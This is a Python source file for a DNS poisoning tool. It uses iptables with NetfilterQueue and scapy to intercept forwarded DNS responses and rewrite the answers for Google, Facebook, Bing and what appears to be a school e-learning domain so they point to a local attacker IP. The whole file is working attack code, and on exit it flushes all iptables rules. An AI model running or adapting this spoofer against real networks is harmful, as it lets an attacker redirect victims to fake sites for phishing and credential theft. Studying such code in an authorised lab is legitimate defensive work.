import os
from scapy.all import *
from netfilterqueue import NetfilterQueue
import socket

class DnsPoisoning():
    def __init__(self,tl) -> None:
        self.tl=tl

    dns_hosts = {
        b"www.google.it.": "192.168.86.174",
        b"google.it.": "192.168.86.174",
        b"www.google.com.": "192.168.86.174",
        b"facebook.com.": "192.168.86.174",
        b"www.facebook.com.": "192.168.86.174",
        b"www.fad.its-ictpiemonte.it.": "192.168.86.174",
        b"fad.its-ictpiemonte.it.": "192.168.86.174",
        b"bing.com.": "192.168.86.174",
        b"google.com.": "192.168.86.174"
        }

    def showDict(self):
        return self.dns_hosts

    def addEntity(self,url,ip):
        ip= socket.gethostbyname(socket.gethostname()) if ip=="" else ip
        self.dns_hosts.update({bytes(url,encoding='utf-8'):ip})

    def removeEntity(self,url):
        self.dns_hosts.pop(bytes(url,encoding='utf-8'))
    
    def process_packet(self,packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            self.tl.write("[Before]:", scapy_packet.summary())
            try:
                scapy_packet = self.modify_packet(scapy_packet)
            except IndexError:
                pass
            self.tl.write("[After ]:", scapy_packet.summary())
            packet.set_payload(bytes(scapy_packet))
        packet.accept()

    def modify_packet(self,packet):
        qname = packet[DNSQR].qname
        print("[GOT] ",qname)
        if qname not in self.dns_hosts:
            print("packet not modified:", qname)
            return packet
        packet[DNS].an = DNSRR(rrname=qname, rdata=self.dns_hosts[qname])
        packet[DNS].ancount = 1
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        return packet
    
    def run(self):
        QUEUE_NUM = 0
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
        queue = NetfilterQueue()
        try:
            queue.bind(QUEUE_NUM, self.process_packet)
            queue.run()
        except KeyboardInterrupt:
            os.system("iptables --flush")
